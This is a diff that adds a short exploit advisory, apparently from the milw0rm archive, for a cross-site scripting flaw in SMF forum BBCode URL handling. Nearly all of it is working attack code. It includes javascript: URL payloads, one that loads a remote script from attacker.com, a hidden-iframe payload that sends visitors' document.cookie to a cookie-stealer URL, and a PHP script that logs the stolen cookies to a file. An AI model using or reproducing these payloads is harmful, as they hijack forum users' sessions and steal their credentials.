@@ -1,0 +1,25 @@
+Author: Xianur0
+
+BBCode of the smf not filtered properly specified urls:
+
+[center][size=14pt][url=javascript:alert('xss')]Saltando Filtro
+:D...[/url][/size]
+[url=javascript:document.write(unescape(%3Cscript+src%3D%22http%3A%2F%2Fwww.attacker.com%2Fexploit.js%22%3E%3C%2Fscript%3E))][img]http://img508.imageshack.us/img508/6982/flmnetworkuserbar494abfyb2.png[/img][/center]
+
+Click on the image, run the javascript..
+
+BBC Cookie Exploit:
+
+[center][size=14pt][url=][/url][/size]
+[url=javascript:
+document.write(unescape('%3Ciframe+width%3D%220%25%22+height%3D%220%25%22+src%3D%22http%3A%2F%2Fwww.attacker.com%2Fcookiestealer.php%3Fcookie%3D%27+%2Bdocument.cookie+%2B%27+frameborder%3D%220%25%22%3E'));][img]http://www.google.com.mx/intl/es_mx/images/logo.gif[/img][/center]
+
+PHP Cookie Stealer:
+
+<?php
+$cookie = $_GET['cookie'];
+$handler = fopen('cookies.txt', 'a');
+fwrite($handler, $cookie."\n");
+?>
+
+# milw0rm.com [2009-02-03]
